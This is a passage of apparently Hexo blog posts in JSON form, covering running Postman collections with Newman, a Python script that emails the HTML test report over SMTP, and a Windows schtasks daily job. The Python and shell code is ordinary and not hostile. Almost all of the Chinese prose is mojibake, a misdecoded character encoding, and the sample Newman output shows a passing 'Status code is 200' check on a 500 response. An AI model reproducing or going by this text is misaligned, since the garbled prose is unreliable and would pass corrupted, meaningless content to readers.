ã€Špostmanæ¥å£ç”¨ä¾‹æ‰¹é‡æ‰§è¡Œ(Newman)ã€‹å·²ç»åœ¨æœ¬åœ°ç”Ÿæˆäº†æµ‹è¯•æŠ¥å‘Šï¼Œè¿™æ—¶å€™éœ€è¦è®¾ç½®ä¸€ä¸ªå®šæ—¶ä»»åŠ¡æ¯å¤©æ—©ä¸Šè‡ªåŠ¨æ‰§è¡Œæµ‹è¯•ç”¨ä¾‹ï¼Œå¹¶ä¸”å‘é€é‚®ä»¶ç»™æŒ‡å®šäººå‘˜ï¼Œè¿™é‡Œç”¨pythonæ‰§è¡Œcmdå‘½å’Œæ¨¡æ‹Ÿå‘é€é‚®ä»¶ï¼Œç„¶åè®¾ç½®widowsè®¡åˆ’ä»»åŠ¡å³å¯æ¯å¤©è‡ªåŠ¨è¿è¡Œã€‚(Linuxä½¿ç”¨crontabå‘½ä»¤è®¾ç½®å®šæ—¶ä»»åŠ¡) ç”¨åˆ°çš„pythonåº“ smtplib email os pythonæ‰§è¡Œcmdå‘½ä»¤1234def test_command(): &#39;&#39;&#39;è°ƒç”¨cmdæ‰§è¡Œæ¥å£æµ‹è¯•å‘½ä»¤&#39;&#39;&#39; command &#x3D; r&#39;newman run E:\\api_collection\\test.postman_collection.json -e E:\\api_collection\\æµ‹è¯•ç¯å¢ƒ.postman_environment.json -r html,json,junit,cli --reporter-html-export E:\\api_collection\\report.html --reporter-json-export E:\\api_collection\\report.json --reporter-junit-export E:\\api_collection\\report.xml&#39; print(os.system(command)) å°†æ‰§è¡Œæ¥å£æµ‹è¯•ç”¨ä¾‹çš„å‘½ä»¤èµ‹å€¼ç»™å˜é‡commandï¼Œåœ¨é€šè¿‡print(os.system(command))æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤ï¼Œç”Ÿæˆæµ‹è¯•æŠ¥å‘Šï¼Œå› ä¸ºNewmanå·²ç»é…ç½®å¥½äº†ç¯å¢ƒå˜é‡ï¼Œæ‰€ä»¥ä¸ç”¨å…³æ³¨åœ¨å“ªä¸ªè·¯å¾„ä¸‹æ‰§è¡Œå‘½ä»¤ã€‚ è®¾è®¡åœ¨æœ¬åœ°è·å–æµ‹è¯•æŠ¥å‘Šçš„å‡½æ•°1def html_report(testreport): è¿™ä¸ªtestreportå‚æ•°æ˜¯æµ‹è¯•æŠ¥å‘Šæ‰€åœ¨çš„ç›®å½• 1.ç½—åˆ—ç›®å½•ä¸‹çš„æ–‡ä»¶1lists &#x3D; os.listdir(testreport) 2.æ‰¾åˆ°htmlæµ‹è¯•æŠ¥å‘Š1234567for i in lists: if &#39;.html&#39; in i: html_report &#x3D; os.path.join(testreport,i) #è·å–htmlæ ¼å¼çš„æµ‹è¯•æŠ¥å‘Š print(html_report) return html_report else: pass forå¾ªç¯æ¥éå†ç›®å½•ä¸‹æ‰€æœ‰æŠ¥å‘Šçš„æ–‡ä»¶åï¼Œé€šè¿‡æ–‡ä»¶åç¼€æ˜¯å¦æ˜¯.htmlæ¥æ‰¾åˆ°htmlæµ‹è¯•æŠ¥å‘Šï¼Œos.path.join(testreport,i)æ–¹æ³•æŠŠæ–‡ä»¶ç›®å½•å’Œæ–‡ä»¶ååˆå¹¶æˆå®Œæ•´çš„è·¯å¾„ã€‚ è®¾è®¡å‘é€é‚®ä»¶çš„å‡½æ•°1def send_mail(html_report): html_reportå‚æ•°å°±æ˜¯ä¸Šä¸€ä¸ªå‡½æ•°çš„è¿”å›å€¼ã€‚ 1.åˆ›å»ºä¸€ä¸ªå¸¦é™„ä»¶çš„å®ä¾‹1234msg &#x3D; MIMEMultipart()msg[&#39;Subject&#39;] &#x3D; Header(&#39;è‡ªåŠ¨åŒ–æµ‹è¯•æŠ¥å‘Š&#39;,&#39;utf-8&#39;) #è¿™ä¸ªæ˜¯é‚®ä»¶ä¸»é¢˜åç§°msg[&#39;From&#39;] &#x3D; Header(&#39;peili&#39;,&#39;utf-8&#39;) #å‘é€è€…åå­—msg[&#39;To&#39;] &#x3D; Header(&#39;ceshi&#39;,&#39;utf-8&#39;) #æ¥æ”¶è€…åå­— 2.é‚®ä»¶æ­£æ–‡å†…å®¹1msg.attach(MIMEText(&#39;æµ‹è¯•ç»„8æœˆåˆ†äº«(æŠ¥å‘Šåœ¨é™„ä»¶)&#39;,&#39;html&#39;,&#39;utf-8&#39;)) MIMETextçš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯å‘é€çš„æ–‡æœ¬ç±»å‹ï¼Œæœ‰htmlï¼Œplainï¼Œbase64ç­‰ã€‚ 3.æ·»åŠ ä¸€ä¸ªé™„ä»¶1234file1 &#x3D; MIMEText(open(html_report,&#39;rb&#39;).read(),&#39;base64&#39;,&#39;utf-8&#39;)file1[&#39;Content-Type&#39;] &#x3D; &#39;application&#x2F;octet-stream&#39;file1[&quot;Content-Disposition&quot;] &#x3D; &#39;attachment; filename&#x3D;&quot;report.html&quot;&#39; #è¿™é‡Œçš„filenameå°±æ˜¯é‚®ä»¶ä¸­é™„ä»¶çš„åå­—ï¼Œå¯ä»¥è‡ªå·±å‘½åmsg.attach(file1) æ·»åŠ å¤šä¸ªé™„ä»¶çš„è¯å°±å†å¤åˆ¶è¿™å››è¡Œä»£ç å¤šå†™å‡ ä¸ªï¼Œä¿®æ”¹open(xx,&#39;rb&#39;)å°±å¥½ã€‚ 4.è¿æ¥é‚®ä»¶æœåŠ¡å™¨å¹¶å‘é€é‚®ä»¶1234smtp &#x3D; smtplib.SMTP_SSL(&#39;smtp.exmail.qq.com&#39;, 465) #ä½¿ç”¨çš„æ˜¯è…¾è®¯ä¼ä¸šé‚®ç®±æœåŠ¡å™¨ï¼Œç«¯å£465smtp.login(&#39;lipei@xxx.com&#39;, &#39;password&#39;) #ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯å‘é€è€…çš„ä¼ä¸šé‚®ç®±è´¦å·å’Œå¯†ç smtp.sendmail(sender, receiver, msg.as_string()) #å‰ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯å‘é€é‚®ç®±å’Œæ¥æ”¶é‚®ç®±smtp.quit() 1.smtp.sendmail(sender, receiver, msg.as_string())ç¬¬äºŒä¸ªå‚æ•°receiveré‚®ä»¶æ¥æ”¶è€…å¯ä»¥æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œè¾¾åˆ°ç¾¤å‘çš„ç›®çš„ã€‚2.è¿™é‡Œæˆ‘ç”¨çš„æ˜¯è…¾è®¯ä¼ä¸šé‚®ç®±ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯ä¸ªäººQQé‚®ç®±çš„è¯ï¼Œç™»é™†å¯†ç ä¸èƒ½ç›´æ¥å†™é‚®ç®±å¯†ç ï¼Œéœ€è¦å¡«å†™QQé‚®ç®±çš„æˆæƒç ï¼Œç™»é™†ç½‘é¡µç‰ˆQQé‚®ç®±ï¼Œåœ¨è®¾ç½®-&gt;è´¦æˆ·é‡Œé¢æ‰¾åˆ°ï¼Œå¹¶è®°å¾—å¼€å¯ä¸‹å›¾æ‰€ç¤ºçš„æœåŠ¡ã€‚ æ³¨ï¼šç»è¿‡å¹³æ—¶çš„ä½¿ç”¨å‘ç°ä¸ªäººQQé‚®ç®±å‘é€é‚®ä»¶ä¼šå¶å°”å¤±è´¥ï¼Œå³ä½¿è®¾ç½®å¥½äº†æœåŠ¡å’Œç¬¬ä¸‰æ–¹æˆæƒç ä»ç„¶ä¼šæœ‰æˆæƒç å¤±æ•ˆç­‰è«åå…¶å¦™çš„é—®é¢˜ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯QQé‚®ç®±çš„ä»€ä¹ˆå®‰å…¨ç­–ç•¥å¯¼è‡´çš„ã€‚ è®¾ç½®å®šæ—¶ä»»åŠ¡å‰é¢å·²ç»æŠŠpythonè„šæœ¬ç¼–å†™å®Œæ¯•ï¼ŒåŒ…æ‹¬ä»æµ‹è¯•ç”¨ä¾‹æ‰§è¡Œåˆ°å‘é€é‚®ä»¶ï¼Œç°åœ¨è®¾ç½®ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œæ¯å¤©è‡ªåŠ¨è¿è¡Œå°±å¯ä»¥äº†ï¼ŒWindows7åŠä»¥å‰ä½¿ç”¨atå‘½ä»¤ï¼Œwindows8åŠä»¥åä½¿ç”¨schtaskså‘½ä»¤ï¼š 12345Windows7åŠä»¥å‰at 8:00 python E:\\api_collection\\send_email.pywindows8åŠä»¥åschtasks &#x2F;create &#x2F;tn api_test &#x2F;tr &quot;python E:\\api_collection\\send_email.py&quot; &#x2F;sc daily &#x2F;st 8:00 æ„æ€å°±æ˜¯æ¯å¤©æ—©ä¸Š8ç‚¹é’Ÿæ‰§è¡Œè¿™ä¸ªpythonè„šæœ¬ã€‚ ä¸è¶³ä¹‹å¤„å¯ä»¥çœ‹åˆ°åˆ©ç”¨pythonèƒ½å®Œæˆè‡ªåŠ¨æ‰§è¡Œæµ‹è¯•ç”¨ä¾‹å¹¶å‘é€é‚®ä»¶ï¼Œä½†æ˜¯éœ€è¦å†™å¾ˆå¤šä»£ç ï¼Œä¹Ÿä¸èƒ½åœ¨çº¿å®æ—¶ç›‘æ§ï¼Œå› æ­¤è¿™ç§æ–¹å¼å¹¶ä¸æ˜¯æœ€å¥½çš„æ–¹å¼ï¼Œä¸‹ä¸€ç¯‡æ–‡ç« å°†ä¼šå†™ä¸€äº›Jenkinsçš„ä¸œè¥¿ï¼Œé€šè¿‡JenkinsåšæŒç»­é›†æˆè¦æ–¹ä¾¿çš„å¤šï¼Œæƒ³è¦çœŸæ­£åšè‡ªåŠ¨åŒ–æ—©æ™šéƒ½è¦æ¥è§¦Jenkinsçš„ã€‚ å®Œæ•´ä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import smtplibfrom email.mime.text import MIMETextfrom email.header import Headerfrom email.mime.multipart import MIMEMultipartimport ostestreport ='E:/api_collection/report'sender = 'lipei@xxx.com'receiver = ['123456789@qq.com','123456789@qq.com']def test_command(): '''è°ƒç”¨cmdæ‰§è¡Œæ¥å£æµ‹è¯•å‘½ä»¤''' command = r'newman run E:\\api_collection\\test.postman_collection.json -e E:\\api_collection\\æµ‹è¯•ç¯å¢ƒ.postman_environment.json -r html,json,junit,cli --reporter-html-export E:\\api_collection\\report\\report.html --reporter-json-export E:\\api_collection\\report\\report.json --reporter-junit-export E:\\api_collection\\report\\report.xml' print(os.system(command))def html_report(testreport): #è¿™ä¸ªå‚æ•°å¡«å†™çš„æ˜¯æµ‹è¯•æŠ¥å‘Šæ‰€åœ¨çš„ç›®å½• '''åœ¨æœ¬åœ°æ‰¾åˆ°htmlæµ‹è¯•æŠ¥å‘Š''' lists = os.listdir(testreport) for i in lists: if '.html' in i: html_report = os.path.join(testreport,i) #è·å–htmlæ ¼å¼çš„æµ‹è¯•æŠ¥å‘Š print(html_report) return html_report else: passdef send_mail(html_report): '''å‘é€é‚®ä»¶''' #åˆ›å»ºä¸€ä¸ªå¸¦é™„ä»¶çš„å®ä¾‹ msg = MIMEMultipart() msg['Subject'] = Header('è‡ªåŠ¨åŒ–æµ‹è¯•æŠ¥å‘Š','utf-8') #è¿™ä¸ªæ˜¯é‚®ä»¶ä¸»é¢˜åç§° msg['From'] = Header('peili','utf-8') msg['To'] = Header('ceshi','utf-8') #é‚®ä»¶æ­£æ–‡å†…å®¹ msg.attach(MIMEText('ç‘äº‘æµ‹è¯•ç»„æ¥å£æµ‹è¯•8æœˆåˆ†äº«(æŠ¥å‘Šåœ¨é™„ä»¶)','html','utf-8')) #ç¬¬äºŒä¸ªå‚æ•°æ˜¯é‚®ä»¶æ ¼å¼ï¼Œå¯ä»¥æ¢æˆå…¶ä»–çš„æ¯”å¦‚è¯´'html'ï¼Œ'base64'ï¼Œ'plain'ç­‰ #æ·»åŠ é™„ä»¶ file1 = MIMEText(open(html_report,'rb').read(),'base64','utf-8') file1['Content-Type'] = 'application/octet-stream' file1[\"Content-Disposition\"] = 'attachment; filename=\"report.html\"' #è¿™é‡Œçš„filenameå°±æ˜¯é‚®ä»¶ä¸­é™„ä»¶çš„åå­—ï¼Œå¯ä»¥è‡ªå·±å‘½å msg.attach(file1) try: smtp = smtplib.SMTP_SSL('smtp.exmail.qq.com', 465) #QQé‚®ç®±å‘é€æœåŠ¡å™¨ä»¥åŠç«¯å£ï¼ŒSMTPé»˜è®¤ç«¯å£æ˜¯25ï¼Œè¿™é‡Œæ”¹æˆ465 smtp.login('lipei@xxx.com', 'password') #å¦‚æœæ˜¯QQé‚®ç®±çš„è¯ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸æ˜¯ç›´æ¥ç”¨çš„å¯†ç ï¼Œç”¨çš„æ˜¯QQé‚®ç®±çš„æˆæƒç  smtp.sendmail(sender, receiver, msg.as_string()) #å‰ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯å‘é€é‚®ç®±å’Œæ¥æ”¶é‚®ç®± smtp.quit() print('æµ‹è¯•æŠ¥å‘Šé‚®ä»¶å‘é€æˆåŠŸ') except smtplib.SMTPException as e: print(e)if __name__ == '__main__': test_command() html_report = html_report(testreport) send_mail(html_report) ç›¸å…³æ–‡ç« postmanå®‰è£…ä»¥åŠé—®é¢˜postmanç®€å•ä½¿ç”¨postmanæ¥å£ç”¨ä¾‹æ‰¹é‡æ‰§è¡Œ(Newman)peili","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"è‡ªåŠ¨åŒ–","slug":"è‡ªåŠ¨åŒ–","permalink":"http://yoursite.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"é‚®ä»¶","slug":"é‚®ä»¶","permalink":"http://yoursite.com/tags/%E9%82%AE%E4%BB%B6/"}]},{"title":"postmanæ¥å£ç”¨ä¾‹æ‰¹é‡æ‰§è¡Œ(Newman)","slug":"postmanæ¥å£ç”¨ä¾‹æ‰¹é‡æ‰§è¡Œ","date":"2017-08-24T10:30:00.000Z","updated":"2018-12-17T02:30:56.849Z","comments":true,"path":"2017/08/24/postmanæ¥å£ç”¨ä¾‹æ‰¹é‡æ‰§è¡Œ/","link":"","permalink":"http://yoursite.com/2017/08/24/postman%E6%8E%A5%E5%8F%A3%E7%94%A8%E4%BE%8B%E6%89%B9%E9%87%8F%E6%89%A7%E8%A1%8C/","excerpt":"","text":"å‰è¨€ä¸Šä¸€ç¯‡ã€Špostmanç®€å•ä½¿ç”¨ã€‹æ–‡ç« è®²äº†postmançš„åŸºæœ¬ç”¨æ³•ä»¥åŠè‡ªå¸¦çš„æ‰¹é‡æ‰§è¡Œæ–¹å¼ï¼Œè¿™ç§æ–¹å¼ç®€å•æœ‰æ•ˆï¼Œä½†æ˜¯åšè‡ªåŠ¨åŒ–å°±æœ‰ä¸€å®šçš„å±€é™äº†ï¼Œè¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯newmançš„ç”¨æ³•ï¼Œå°†postmanç”¨ä¾‹å¯¼å‡ºï¼Œç”¨newmanåœ¨Windowså‘½ä»¤è¡Œæ¥æ‰§è¡Œï¼Œå¹¶ä¸”ç”Ÿæˆæµ‹è¯•æŠ¥å‘Šã€‚ Newmançš„å®‰è£…1.å®‰è£…Node.jså®˜ç½‘åœ°å€ï¼šhttps://nodejs.org/en/download/åœ¨Node.jså®˜ç½‘é€‰æ‹©åˆé€‚çš„ç‰ˆæœ¬ï¼Œæˆ‘è¿™é‡Œé€‰æ‹©çš„æ˜¯Windowså¹³å°64ä½çš„ï¼Œä¸‹è½½å®Œæˆåå®‰è£…ï¼Œä¸€è·¯ç‚¹å‡»ä¸‹ä¸€æ­¥å°±å¥½ã€‚å®‰è£…å®Œååœ¨cmdé‡Œé¢è¿è¡Œnode -v,å‡ºç°ä»¥ä¸‹ç‰ˆæœ¬å·ä¿¡æ¯å°±æ˜¯å®‰è£…æˆåŠŸã€‚ 12C:\\windows\\system32&gt;node -vv6.11.1 2.å®‰è£…NewmanNode.jså·²ç»è‡ªå¸¦äº†npmï¼Œå› æ­¤ç›´æ¥åœ¨å‘½ä»¤è¡Œç›´æ¥è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç­‰å¾…å®‰è£…å®Œæˆã€‚ 1npm install -g newman å®‰è£…å®Œæˆåï¼Œåœ¨å‘½ä»¤è¡Œè¾“å…¥newman -v,å‡ºç°ä¸‹é¢ç‰ˆæœ¬å·ä¿¡æ¯å°±æ˜¯å·²ç»å®‰è£…æˆåŠŸã€‚ 12C:\\windows\\system32&gt;newman -v3.8.0 Newmanå‘½ä»¤è¿™é‡Œåªå†™ä»¥ä¸‹æœ€å¸¸ç”¨çš„å‘½ä»¤åŠå‚æ•°ï¼Œæ›´å¤šè¯¦æƒ…å‚è€ƒNewmanå®˜æ–¹æ–‡æ¡£ã€‚ 1.æœ€ç®€å•çš„å‘½ä»¤ä»»ä½•è·¯å¾„ä¸‹æ‰“å¼€cmdé‡Œé¢è¾“å…¥è¿™ä¸ªå‘½ä»¤ 1newman run E:\\api_collection\\test.postman_collection.json -e E:\\api_collection\\æµ‹è¯•ç¯å¢ƒ.postman_environment.json E:\\api_collection\\test.postman_collection.jsonå°±æ˜¯ä¸Šä¸€ç¯‡æ–‡ç« æœ€åé¢å¯¼å‡ºåˆ°æœ¬åœ°çš„æ¥å£ç”¨ä¾‹collectionE:\\api_collection\\æµ‹è¯•ç¯å¢ƒ.postman_environment.jsonæ˜¯ä¸Šä¸€ç¯‡æ–‡ç« æœ€åé¢å¯¼å‡ºçš„ç¯å¢ƒé…ç½®ä¿¡æ¯æ‰§è¡Œå®Œæ¯•åå¯ä»¥ç›´æ¥åœ¨cmdçª—å£çœ‹åˆ°å¦‚ä¸‹æµ‹è¯•ç»“æœï¼Œä½†æ˜¯ç”¨ä¾‹è¾ƒå¤šçš„æ—¶å€™å°±ä¸æ–¹ä¾¿çœ‹äº†ï¼Œå› æ­¤åœ¨æœ¬åœ°ç”Ÿæˆæµ‹è¯•æŠ¥å‘Šä¼šæ›´å¥½ã€‚ 1234567891011121314151617181920212223242526272829C:\\windows\\system32&gt;newman run E:\\api_collection\\test.postman_collection.json -e E:\\api_collection\\æµ‹è¯•ç¯å¢ƒ.postman_environment.jsonnewmantestâ†’ test_linshi POST 10.60.xx.xx:8888&#x2F;api&#x2F;test&#x2F;user&#x2F;userLogin [500 Internal Server Error, 327B, 124ms] âˆš Status code is 200 âˆš Body matches stringâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ â”‚ executed â”‚ failed â”‚â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚ iterations â”‚ 1 â”‚ 0 â”‚â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚ requests â”‚ 1 â”‚ 0 â”‚â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚ test-scripts â”‚ 1 â”‚ 0 â”‚â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚ prerequest-scripts â”‚ 0 â”‚ 0 â”‚â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚ assertions â”‚ 2 â”‚ 0 â”‚â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚ total run duration: 204ms â”‚â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚ total data received: 118B (approx) â”‚â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚ average response time: 124ms â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ 2.æ‰§è¡Œå¤šæ¬¡1newman run E:\\api_collection\\test.postman_collection.json -n 10 åœ¨ä¸Šä¸€ä¸ªå‘½ä»¤çš„åé¢åŠ ä¸Š-n 10ï¼Œä¹Ÿå°±æ˜¯è¿™æ¡æµ‹è¯•å‘½ä»¤è¿è¡Œ10æ¬¡ã€‚ 3.ç”Ÿæˆæµ‹è¯•æŠ¥å‘Š1newman run E:\\api_collection\\test.postman_collection.json -e E:\\api_collection\\æµ‹è¯•ç¯å¢ƒ.postman_environment.json -r html,json,junit --reporter-json-export jsonOut.json --reporter-junit-export xmlOut.xml --reporter-html-export htmlOut.html -r html,json,junit æŒ‡å®šæˆ‘è¦ç”Ÿæˆhtmlï¼Œjsonï¼Œxmlè¿™ä¸‰ç§å½¢å¼çš„æµ‹è¯•æŠ¥å‘Š--reporter-json-export jsonOut.json ç”Ÿæˆjsonæ ¼å¼çš„æµ‹è¯•æŠ¥å‘Šï¼ŒæŠ¥å‘Šåå‰é¢æ²¡æœ‰æ·»åŠ è·¯å¾„çš„è¯å°±ä¼šç”Ÿæˆåœ¨æ‰§è¡Œå‘½ä»¤æ‰€åœ¨çš„å½“å‰ç›®å½•--reporter-junit-export xmlOut.xml ç”Ÿæˆxmlæ ¼å¼çš„æµ‹è¯•æŠ¥å‘Š--reporter-html-export htmlOut.html ç”Ÿæˆhtmlæ ¼å¼çš„æµ‹è¯•æŠ¥å‘Š ç”Ÿæˆç»“æœå¦‚ä¸‹ï¼š ç›¸å…³æ–‡ç« postmanå®‰è£…ä»¥åŠé—®é¢˜postmanç®€å•ä½¿ç”¨å®šæ—¶ä»»åŠ¡ä¸Pythonå‘é€é‚®ä»¶xx","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"æ¥å£æµ‹è¯•","slug":"æ¥å£æµ‹è¯•","permalink":"http://yoursite.com/tags/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/"},{"name":"å·¥å…·ä½¿ç”¨","slug":"å·¥å…·ä½¿ç”¨","permalink":"http://yoursite.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"name":"postman","slug":"postman","permalink":"http://yoursite.com/tags/postman/"},{"name":"newman","slug":"newman","permalink":"http://yoursite.com/tags/newman/"}]},{"title":"postmanç®€å•ä½¿ç”¨","slug":"postmanç®€å•ä½¿ç”¨","date":"2017-08-22T10:30:00.000Z","updated":"2018-12-17T02:30:56.741Z","comments":true,"path":"2017/08/22/postmanç®€å•ä½¿ç”¨/","link":"","permalink":"http://yoursite.com/2017/08/22/postman%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/","excerpt":"","text":"å‰è¨€ä¸Šä¸€ç¯‡æ–‡ç« ã€Špostmanå®‰è£…ä»¥åŠé—®é¢˜ã€‹å·²ç»è¯´æ˜äº†å¦‚ä½•å®‰è£…å¥½postmanï¼Œç°åœ¨å†™ä¸€ä¸‹postmançš„ä½¿ç”¨ï¼Œå®ƒç”¨æ³•éå¸¸ä¸°å¯Œå¤šæ ·ï¼Œè¿™é‡Œåªä¸¾ç®€å•çš„ä¾‹å­æ¥è¯´æ˜å¤§è‡´çš„æ“ä½œæµç¨‹ï¼ŒåŒ…æ‹¬è¯·æ±‚ã€æ–­è¨€ã€ä¿å­˜ã€æ‰¹é‡æ‰§è¡Œã€å¯¼å…¥å¯¼å‡ºç­‰ã€‚ GETè¯·æ±‚ä¸Šå›¾å°±æ˜¯ä¸€ä¸ªæœ€ç®€å•çš„GETè¯·æ±‚ï¼Œè¯·æ±‚æ–¹æ³•ä¸‹æ‹‰æ¡†é€‰æ‹©GETï¼Œæ¥å£åœ°å€æ å¡«å†™éœ€è¦è¯·æ±‚çš„æ¥å£ï¼Œæˆ‘è¿™é‡Œç›´æ¥å†™äº†ç™¾åº¦çš„ä¸»é¡µï¼Œç„¶åç‚¹å‡»Sendå°±å®Œæˆäº†è¯·æ±‚ã€‚ä¸‹æ–¹æ˜¯è¯·æ±‚çš„ç»“æœï¼Œå¯ä»¥çœ‹åˆ°å³ä¾§çŠ¶æ€ç æ˜¯200çŠ¶æ€è¯æ˜è¯·æ±‚æˆåŠŸï¼Œè¯·æ±‚è¿”å›å€¼æ˜¯ä¸€ä¸ªhtmlã€‚é¡µé¢æœ€å·¦ä¾§æœ‰historyè¯·æ±‚å†å²æ ï¼Œå¯ä»¥åœ¨è¿™é‡Œæ‰¾å·²ç»å‘é€è¿‡çš„æ‰€æœ‰è¯·æ±‚ï¼Œé€‰æ‹©ç‚¹å‡»ä»¥åå¯ä»¥é‡å¤è¯·æ±‚ã€‚ POSTè¯·æ±‚åœ¨è¯·æ±‚æ–¹æ³•ä¸‹æ‹‰æ¡†é€‰æ‹©POSTæ–¹æ³•ï¼Œæ¥å£åœ°å€æ å¡«å†™éœ€è¦è¯·æ±‚çš„æ¥å£ï¼Œç„¶åå¡«å†™è¯·æ±‚å‚æ•°ã€‚åœ¨è¯·æ±‚çš„bodyéƒ¨åˆ†ç‚¹å‡»form-dataï¼Œä»¥key-valueæ ·å¼è¯·æ±‚å‚æ•°ã€‚æˆ–è€…ç‚¹å‡»rawï¼Œä»¥jsonæ ¼å¼å¡«å†™è¯·æ±‚å‚æ•°ï¼Œå¼€å‘ç»™çš„æ¥å£æ–‡æ¡£é‡Œé¢å‚æ•°å“¦è¾ƒå¤šçš„è¯ä¸€èˆ¬ä»¥jsonæ ¼å¼ä¹¦å†™ï¼Œæ‰€ä»¥åªè¦å¤åˆ¶ç²˜è´´è¿‡æ¥å¡«å†™åˆ°bodyéƒ¨åˆ†çš„rawæ ä¸‹å°±å¯ä»¥ã€‚ è¯·æ±‚æ–­è¨€è®¾ç½®äº†æ–­è¨€ä»¥åèƒ½æ¸…æ¥šçš„çœ‹å‡ºè¿™ä¸ªè¯·æ±‚æ˜¯å¦é€šè¿‡ï¼Œä¹Ÿæ˜¯åé¢åšè‡ªåŠ¨åŒ–çš„å¿…å¤‡æ¡ä»¶ã€‚ç‚¹å‡»è¯·æ±‚çš„testæ ï¼Œåœ¨è¾“å…¥æ¡†å¡«å†™æ–­è¨€ï¼Œè¿™é‡Œçš„å†™æ³•éƒ½æ˜¯jsæ ¼å¼çš„ï¼Œä½†æ˜¯ä¹Ÿä¸ç”¨æ‹…å¿ƒå†™èµ·æ¥éº»çƒ¦ï¼Œå› ä¸ºå¸¸ç”¨çš„æ–­è¨€postmanå·²ç»åœ¨å³ä¾§ç»™å‡ºäº†ç°æˆçš„å†™æ³•ï¼Œç‚¹å‡»ä¸€ä¸‹å°±å¯ä»¥è‡ªåŠ¨å¡«å†™åˆ°testæ ä¸‹ã€‚æ¯”å¦‚æˆ‘è¿™é‡Œé€‰æ‹©Status codeï¼šCode is 200æ¥åˆ¤æ–­è¯·æ±‚è¿”å›çš„çŠ¶æ€ç æ˜¯ä¸æ˜¯200ï¼Œç‚¹å‡»sendè¯·æ±‚ä¹‹åå¯ä»¥åœ¨ä¸‹æ–¹è¯·æ±‚ç»“æœçš„Testæ çœ‹åˆ°ç»“æœæ˜¯å¤±è´¥çš„ï¼Œå› ä¸ºè¿™ä¸ªæ¥å£è¿˜æ²¡æœ‰å¼€å‘å®Œæˆï¼ŒçŠ¶æ€ç è¿”å›çš„æ˜¯500ã€‚ 